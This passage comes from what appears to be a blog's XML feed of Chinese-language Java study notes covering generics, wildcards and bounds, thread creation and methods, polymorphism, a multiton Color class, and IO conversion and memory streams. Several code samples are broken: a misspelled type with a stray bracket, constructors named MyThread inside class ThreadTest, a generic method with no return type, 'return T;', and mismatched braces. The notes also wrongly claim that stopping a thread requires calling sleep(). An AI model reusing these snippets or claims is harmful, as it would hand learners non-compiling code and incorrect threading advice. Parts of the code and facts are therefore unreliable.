]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java泛型]]></title>
      <url>/2019/10/05/Java%E6%B3%9B%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><blockquote>
<p>类中的属性或者方法的参数与返回值可以由对象实例化时决定。</p>
</blockquote>
<ul>
<li>泛型类</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>&lt;<span class="title">T</span>&gt;</span>&#123;<span class="comment">//设置泛型</span></span><br><span class="line">    <span class="comment">//private static T type;  //泛型不能使用在静态属性上</span></span><br><span class="line">    <span class="keyword">private</span> T type;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPoint</span><span class="params">(T type)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type=type;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="comment">//Ponint&lt;int&gt; point = new Point&lt;int&gt;();//不能使用基本类型</span></span><br><span class="line">        Ponint&lt;Integer&gt; point = <span class="keyword">new</span> Point&lt;Integer&gt;&gt;();<span class="comment">//使用泛型</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>泛型接口</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Imessage</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(T t)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一种方式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MessageImpl</span>&lt;<span class="title">S</span>&gt; <span class="keyword">implements</span> <span class="title">Imessage</span>&lt;<span class="title">S</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(S t)</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第二种方式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MessageImpl</span> <span class="keyword">implements</span> <span class="title">Imessage</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String t)</span></span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>泛型方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无返回值</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt;  getResult(T type)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有返回值</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">getResult</span><span class="params">(T type)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="通配符-lt-gt"><a href="#通配符-lt-gt" class="headerlink" title="通配符&lt;?&gt;"></a>通配符&lt;?&gt;</h2><p><code>不能使用在类上或者new创建对象上</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo04</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 用在形参上</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(List&lt;?&gt; list)</span> </span>&#123;</span><br><span class="line">  	 List&lt;?&gt; list2; <span class="comment">// 用在声明变量上</span></span><br><span class="line">   </span><br><span class="line">   	 list2 = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">  	 list2 = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">  	 list2 = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">  	&#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  	 test(<span class="keyword">new</span> ArrayList&lt;String&gt;());</span><br><span class="line">   	test(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="上限"><a href="#上限" class="headerlink" title="上限"></a>上限</h2><p>？ extends 类：设置泛型上限</p>
<p>表示泛型只允许设置该类或该类的子类</p>
<h2 id="下限"><a href="#下限" class="headerlink" title="下限"></a>下限</h2><p>？super 类：设置泛型的下限</p>
<p>表示泛型只允许使用该类或该类的父类</p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java多线程]]></title>
      <url>/2019/10/05/Java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      <content type="html"><![CDATA[<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><p>一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</p>
<h1 id="线程的生命周期"><a href="#线程的生命周期" class="headerlink" title="线程的生命周期"></a>线程的生命周期</h1><blockquote>
<p>创建状态</p>
</blockquote>
<p>创建一个新线程之后，线程会保持创建状态，等待start（）方法的调用。</p>
<blockquote>
<p>就绪状态</p>
</blockquote>
<p>当线程对象调用了start()方法之后，该线程就进入就绪状态。</p>
<blockquote>
<p>运行状态</p>
</blockquote>
<p>如果就绪状态的线程获取 CPU 资源，就可以执行 run()，此时线程便处于运行状态。</p>
<blockquote>
<p>阻塞状态</p>
</blockquote>
<p>如果一个线程执行了sleep（睡眠）、suspend（挂起）等方法，失去所占用资源之后，该线程就从运行状态进入阻塞状态。</p>
<blockquote>
<p>死亡状态</p>
</blockquote>
<p>一个运行状态的线程完成任务或者其他终止条件发生时，该线程就切换到终止状态。</p>
<h1 id="线程的创建"><a href="#线程的创建" class="headerlink" title="线程的创建"></a>线程的创建</h1><ul>
<li>通过实现 Runnable 接口；</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadTest</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;	<span class="comment">// 线程的主体类</span></span><br><span class="line">	<span class="keyword">private</span> String name ;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;	<span class="comment">// 覆写线程的主体方法</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span> ; x &lt; <span class="number">10</span> ; x ++) &#123;</span><br><span class="line">			<span class="comment">//运行内容</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Thread test = <span class="keyword">new</span> Thread(<span class="keyword">new</span> ThreadTest(<span class="string">"Test"</span>)) ;</span><br><span class="line">		test.start(); <span class="comment">// 启动多线程</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过继承 Thread 类本身；</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadTest</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;	<span class="comment">// 继承</span></span><br><span class="line">	<span class="keyword">private</span> String name ;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;	<span class="comment">// 覆写线程的主体方法</span></span><br><span class="line">			<span class="comment">//运行内容</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		ThreadTest test = <span class="keyword">new</span> ThreadTest(<span class="string">"Test"</span>) ;</span><br><span class="line">		test.start() ;	<span class="comment">//线程启动</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 Callable 和 Future 创建线程。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadTest</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> T <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;		<span class="comment">//覆写主体方法</span></span><br><span class="line">			<span class="comment">//方法内容</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> T;	<span class="comment">//返回内容</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		FutureTask&lt;T&gt; test = <span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> ThreadTest()) ;</span><br><span class="line">		<span class="keyword">new</span> Thread(test).start(); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置名称：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Thread</span><span class="params">(Runnable target,String name)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"><span class="comment">//获得名称：</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//休眠：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">long</span> millisec)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//中断：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">interrupt</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取线程：</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Thread <span class="title">currentThread</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//强制执行:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">join</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//暂停:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">yield</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置优先级</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setPriority</span><span class="params">(<span class="keyword">int</span> priority)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* Java 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。</span></span></span><br><span class="line"><span class="function"><span class="comment">*/</span></span></span><br><span class="line"><span class="function"><span class="comment">//获取优先级    </span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getPriority</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<h1 id="同步与死锁"><a href="#同步与死锁" class="headerlink" title="同步与死锁"></a>同步与死锁</h1><blockquote>
<p>同步</p>
</blockquote>
<p>使用synchronized关键字可以让该方法一次只允许一个线程访问。</p>
<blockquote>
<p>死锁</p>
</blockquote>
<p>彼此都等待对方让出资源。</p>
<h1 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">suspend</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>这三种方法基本被废除，所有需要使用停止，需要调用sleep（）方法来进行停止。</p>
<h1 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setDaemon</span><span class="params">(<span class="keyword">boolean</span> on)</span></span></span><br></pre></td></tr></table></figure>

<p>守护线程在程序执行完成就会停止。</p>
]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java多态]]></title>
      <url>/2019/10/05/Java%E5%A4%9A%E6%80%81/</url>
      <content type="html"><![CDATA[<h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p><code>多态就是同一个接口，使用不同的实例而执行不同操作</code></p>
<ul>
<li>向上转型：父类 父类实例 = 子类实例（自动完成）<ul>
<li>Father f = new Son();</li>
</ul>
</li>
<li>向下转型：子类 子类实例 = (子类)父类实例（强制完成转换）<ul>
<li>Son s = (Son)f</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      show(<span class="keyword">new</span> Cat());  <span class="comment">// 以 Cat 对象调用 show 方法</span></span><br><span class="line">      show(<span class="keyword">new</span> Dog());  <span class="comment">// 以 Dog 对象调用 show 方法</span></span><br><span class="line">                </span><br><span class="line">      Animal a = <span class="keyword">new</span> Cat();  <span class="comment">// 向上转型  </span></span><br><span class="line">      a.eat();               <span class="comment">// 调用的是 Cat 的 eat</span></span><br><span class="line">      Cat c = (Cat)a;        <span class="comment">// 向下转型  </span></span><br><span class="line">      c.work();        <span class="comment">// 调用的是 Cat 的 work</span></span><br><span class="line">  &#125;  </span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(Animal a)</span>  </span>&#123;</span><br><span class="line">      a.eat();  </span><br><span class="line">        <span class="comment">// 类型判断</span></span><br><span class="line">        <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Cat)  &#123;  <span class="comment">// 猫做的事情 //instanceof用于判断实例a是否是Cat的实例对象</span></span><br><span class="line">            Cat c = (Cat)a;  </span><br><span class="line">            c.work();  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Dog) &#123; <span class="comment">// 狗做的事情 </span></span><br><span class="line">            Dog c = (Dog)a;  </span><br><span class="line">            c.work();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"吃鱼"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"抓老鼠"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"吃骨头"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"看家"</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java多例设计]]></title>
      <url>/2019/10/05/Java%E5%A4%9A%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
      <content type="html"><![CDATA[<h1 id="多例设计"><a href="#多例设计" class="headerlink" title="多例设计"></a>多例设计</h1><p><code>构造方法私有化</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Color</span> </span>&#123; <span class="comment">// 定义描述颜色的类</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Color RED = <span class="keyword">new</span> Color(<span class="string">"红色"</span>) ;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Color GREEN = <span class="keyword">new</span> Color(<span class="string">"绿色"</span>) ;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Color BLUE = <span class="keyword">new</span> Color(<span class="string">"蓝色"</span>) ;</span><br><span class="line">	<span class="keyword">private</span> String title ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Color</span><span class="params">(String title)</span> </span>&#123;	<span class="comment">// 构造方法私有化</span></span><br><span class="line">		<span class="keyword">this</span>.title = title ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Color <span class="title">getInstance</span><span class="params">(String color)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">switch</span>(color) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">"red"</span>: <span class="keyword">return</span> RED ;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">"green"</span>: <span class="keyword">return</span> GREEN ;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">"blue"</span>: <span class="keyword">return</span> BLUE ;</span><br><span class="line">			<span class="keyword">default</span>: <span class="keyword">return</span> <span class="keyword">null</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.title ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Color c = Color.getInstance(<span class="string">"green"</span>) ;</span><br><span class="line">		System.out.println(c) ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      
        <categories>
            
            <category> Java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java-IO]]></title>
      <url>/2019/10/05/Java-IO/</url>
      <content type="html"><![CDATA[<h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul>
<li>OutputStreamWriter</li>
</ul>
<p><code>负责把输出字节流转换为输出字符流</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span> <span class="params">(OutputStream out)</span></span>;<span class="comment">//字节流转换为字符流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span><span class="params">(OutputStream out, String enc)</span></span>;<span class="comment">//指定编码规范</span></span><br></pre></td></tr></table></figure>

<ul>
<li>InputStreamReader</li>
</ul>
<p><code>负责把字节输入流转换为字符输入流</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InputStreamReader</span> <span class="params">(InputStream in)</span></span>;<span class="comment">//字节流转换为字符流</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InputStreamReader</span><span class="params">(InputStream in, String enc)</span></span>; <span class="comment">//指定编码规范</span></span><br></pre></td></tr></table></figure>

<h1 id="内存流"><a href="#内存流" class="headerlink" title="内存流"></a>内存流</h1><p><code>数据在内存中处理比磁盘(硬盘)要更快一些，有时候可能需要临时在内存中保存并处理数据，内存流效率会更高</code></p>
<ul>
<li>ByteArrayInputStream</li>
<li>ByteArrayOutputStream</li>
</ul>
